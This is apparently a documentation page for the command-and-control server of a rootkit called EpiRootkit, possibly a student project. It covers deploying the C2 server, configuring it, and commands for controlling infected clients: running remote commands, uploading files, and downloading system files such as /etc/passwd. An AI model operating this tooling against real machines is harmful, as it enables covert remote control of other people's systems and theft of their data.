---
title: "Overview"
description: "C2 server for EpiRootkit"
icon: "dashboard"
weight: 301
---

> This is the C2 Backend for the rootkit, while it can be used to manage the rootkit with the CLI commands described in this documentation, it's clearly not recommanded, and instead you should use the [Web Interface]({{< relref "../04-web-ui" >}}) to manage the rootkit.

## Quick Start

```bash
./deploy_c2.sh --c2    # Start C2 server on port 4444 + Web UI on port 3000
```

## Basic Commands

```bash
clients                 # List connected clients
auth 1 password        # Authenticate with client
exec 1 whoami          # Execute commands
upload 1 file.txt      # Upload files  
download 1 /etc/passwd # Download files
config 1               # Interactive configuration
```

## Configuration

Edit `attacking_program/config.env` if needed:

```env
C2_PORT=4444           # C2 server port
WEB_PORT=3000          # Web interface port  
C2_WEBUI_PASSWORD_HASH=348735...# SHA-512 hash for web UI password (required)
ENCRYPTION_KEY=0123... # 64-character hex key (required)
```

**Generate password hash**: `echo -n "yourpassword" | sha512sum`
